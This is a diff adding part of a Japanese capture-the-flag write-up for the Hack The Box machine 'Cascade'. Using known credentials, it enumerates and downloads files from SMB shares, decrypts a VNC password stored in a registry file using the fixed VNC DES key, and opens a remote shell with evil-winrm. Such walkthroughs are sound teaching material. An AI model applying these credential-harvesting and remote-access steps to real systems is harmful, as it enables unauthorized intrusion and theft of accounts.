@@ -94,4 +94,120 @@ Version: v1.0.3 (9dad6e1) - 10/25/22 - Ronnie Flathers @ropnop
 ...
 ```
 
+r.thompsonのクリデンシャルでSMBシェアをenumする：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
+└─$ smbclient -U r.thompson%rY4n5eva -L 10.10.10.182
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        Audit$          Disk      
+        C$              Disk      Default share
+        Data            Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        print$          Disk      Printer Drivers
+        SYSVOL          Disk      Logon server share 
+```
+
+Dataにおいしい情報があった：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
+└─$ smbmap -R 'Data' -u r.thompson -p rY4n5eva -H 10.10.10.182 --depth 10 | tee SMB_Data.txt
+[+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	Data                                              	READ ONLY	
+	.\Data\*
+	dr--r--r--                0 Wed Jan 29 07:05:51 2020	.
+	dr--r--r--                0 Wed Jan 29 07:05:51 2020	..
+	dr--r--r--                0 Mon Jan 13 10:45:14 2020	Contractors
+	dr--r--r--                0 Mon Jan 13 10:45:10 2020	Finance
+	dr--r--r--                0 Wed Jan 29 03:04:51 2020	IT
+	dr--r--r--                0 Mon Jan 13 10:45:20 2020	Production
+	dr--r--r--                0 Mon Jan 13 10:45:16 2020	Temps
+	.\Data\IT\*
+	dr--r--r--                0 Wed Jan 29 03:04:51 2020	.
+	dr--r--r--                0 Wed Jan 29 03:04:51 2020	..
+	dr--r--r--                0 Wed Jan 29 03:00:30 2020	Email Archives
+	dr--r--r--                0 Wed Jan 29 03:04:51 2020	LogonAudit
+	dr--r--r--                0 Wed Jan 29 09:53:04 2020	Logs
+	dr--r--r--                0 Wed Jan 29 07:06:59 2020	Temp
+	.\Data\IT\Email Archives\*
+	dr--r--r--                0 Wed Jan 29 03:00:30 2020	.
+	dr--r--r--                0 Wed Jan 29 03:00:30 2020	..
+	fr--r--r--             2522 Wed Jan 29 03:00:30 2020	Meeting_Notes_June_2018.html
+	.\Data\IT\Logs\*
+	dr--r--r--                0 Wed Jan 29 09:53:04 2020	.
+	dr--r--r--                0 Wed Jan 29 09:53:04 2020	..
+	dr--r--r--                0 Wed Jan 29 09:53:04 2020	Ark AD Recycle Bin
+	dr--r--r--                0 Wed Jan 29 09:56:00 2020	DCs
+	.\Data\IT\Logs\Ark AD Recycle Bin\*
+	dr--r--r--                0 Wed Jan 29 09:53:04 2020	.
+	dr--r--r--                0 Wed Jan 29 09:53:04 2020	..
+	fr--r--r--             1303 Wed Jan 29 10:19:11 2020	ArkAdRecycleBin.log
+	.\Data\IT\Logs\DCs\*
+	dr--r--r--                0 Wed Jan 29 09:56:00 2020	.
+	dr--r--r--                0 Wed Jan 29 09:56:00 2020	..
+	fr--r--r--             5967 Mon Jan 27 07:22:05 2020	dcdiag.log
+	.\Data\IT\Temp\*
+	dr--r--r--                0 Wed Jan 29 07:06:59 2020	.
+	dr--r--r--                0 Wed Jan 29 07:06:59 2020	..
+	dr--r--r--                0 Wed Jan 29 07:06:55 2020	r.thompson
+	dr--r--r--                0 Wed Jan 29 05:00:05 2020	s.smith
+	.\Data\IT\Temp\s.smith\*
+	dr--r--r--                0 Wed Jan 29 05:00:05 2020	.
+	dr--r--r--                0 Wed Jan 29 05:00:05 2020	..
+	fr--r--r--             2680 Wed Jan 29 05:00:01 2020	VNC Install.reg
+```
+
+次のようにファイルをダウンロードする：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
+└─$ smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182 -R Data -A 'Meeting_Notes_June_2018.html|ArkAdRecycleBin.log|VNC Install.reg'
+[+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
+[+] Starting search for files matching 'Meeting_Notes_June_2018.html|ArkAdRecycleBin.log|VNC Install.reg' on share Data.
+[+] Match found! Downloading: Data\IT\Email Archives\Meeting_Notes_June_2018.html
+[+] Match found! Downloading: Data\IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log
+[+] Match found! Downloading: Data\IT\Temp\s.smith\VNC Install.reg
+```
+
+# initial shell
+
+VNC Install.regというファイルにパスワードのhex表記があるのを発見：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
+└─$ cat 10.10.10.182-Data_IT_Temp_s.smith_VNC\ Install.reg
+...
+"EnableUrlParams"=dword:00000001
+"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+"AlwaysShared"=dword:00000000
+"NeverShared"=dword:00000000
+...
+```
+
+以下のように復号（[ここ](https://github.com/frizb/PasswordDecrypts)を参考）：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182/SMB-Data]
+└─$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
+00000008
+```
+
+ファイル名からして、s.smithのパスワードだと考えられるので次のように`evil-winrm`を実行してシェルをとる：
+
+```
+┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
+└─$ evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
+...
+*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
+cascade\s.smith
+```
+
 
